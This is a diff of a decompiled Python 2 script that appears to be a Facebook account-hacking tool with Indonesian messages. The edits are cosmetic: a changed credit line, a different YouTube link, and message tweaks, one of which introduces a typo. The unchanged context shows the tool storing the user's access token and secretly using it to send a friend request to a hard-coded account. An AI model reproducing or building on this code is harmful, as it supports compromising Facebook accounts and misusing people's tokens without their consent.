@@ -1,4 +1,4 @@
-#Decompiled by MR.K7C8NG
+#Decompiled by KONTOl GaMINg
 import os, sys, time, datetime, random, hashlib, re, threading, json, getpass, urllib, requests, mechanize
 from multiprocessing.pool import ThreadPool
 
@@ -97,7 +97,7 @@ def login():
                 zedd.close()
                 print '\n\x1b[1;91m[\x1b[1;96m\xe2\x9c\x93\x1b[1;91m] \x1b[1;92mLogin berhasil'
                 requests.post('https://graph.facebook.com/me/friends?method=post&uids=gwimusa3&access_token=' + z['access_token'])
-                os.system('xdg-open https://youtube.com/NjankSoekamti')
+                os.system('xdg-open https://youtube.com/attahalilintar')
                 time.sleep(2)
                 menu()
             except requests.exceptions.ConnectionError:
@@ -426,7 +426,7 @@ def mini():
                                             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
                                             menu_hack()
         except KeyError:
-            print '\x1b[1;91m[!] Terget tidak ditemukan'
+            print '\x1b[1;91m[!] Target tidak ditemukan'
             raw_input('\n\x1b[1;91m[ \x1b[1;97mKembali \x1b[1;91m]')
             menu_hack()
 
@@ -528,7 +528,7 @@ def super():
     try:
         toket = open('login.txt', 'r').read()
     except IOError:
-        print '\x1b[1;91m[!] Token tidak ditemukan'
+        print '\x1b[1;91m[!] Toket tidak ditemukan'
         os.system('rm -rf login.txt')
         time.sleep(1)
         login()
